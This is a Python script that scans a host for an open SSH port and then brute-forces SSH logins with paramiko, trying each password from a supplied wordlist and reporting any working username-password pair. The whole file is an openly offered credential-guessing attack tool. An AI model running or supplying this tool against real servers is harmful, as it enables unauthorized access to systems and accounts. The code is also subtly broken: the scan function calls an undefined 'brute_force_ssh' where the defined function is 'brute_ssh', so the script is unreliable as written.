import socket
import time
from colorama import init, Fore
import paramiko

# Initialize colorama
init()
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def scan_port(host, port):
    """
    Scan a single port
    :param host: (str) host to scan
    :param port: (int) port to scan
    :return: None
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)  # Set the timeout to 1 second
        result = sock.connect_ex((host, port))
        if result == 0:
            print(f"Port {port} is open")
            if port == 22:  # If port 22 (SSH) is open, you can proceed with the brute-force attack here
                # Implement your brute-force attack code
                brute_force_ssh(host)
        else:
            print(f"Port {port} is closed")
        sock.close()
    except socket.error:
        print("Error occurred while connecting to the host")

def brute_ssh(hostname, username, password):
    """
    SSH Brute force tool
    :param hostname: (str) Hostname to connect to
    :param username: (str) username to use to connect
    :param password: (str) password to use to connect
    :return: None
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=1)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable. {RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid Credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE} [*] Quota exceeded, retrying after 1 minute... {RESET}")
        time.sleep(60)
        return brute_ssh(hostname, username, password)
    else:
        print(f"{GREEN} [+] Found Combo: {username}:{password} {RESET}")
        return True

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python script.")
    parser.add_argument("-H", "--host", help="Hostname or IP Address of SSH Server to bruteforce.")
    parser.add_argument("-P", "--passfile", help="File that contains a password list in each line.")
    parser.add_argument("-u", "--user", help="Host username.")
    args = parser.parse_args()
    host = args.host
    passfile = args.passfile
    user = args.user

    # Scan port 22
    scan_port(host, 22)

    # Check passwords from the file
    with open(passfile, "r") as p:
        for passwordAttempt in p:
            if brute_ssh(host, user, passwordAttempt.strip()):
                break
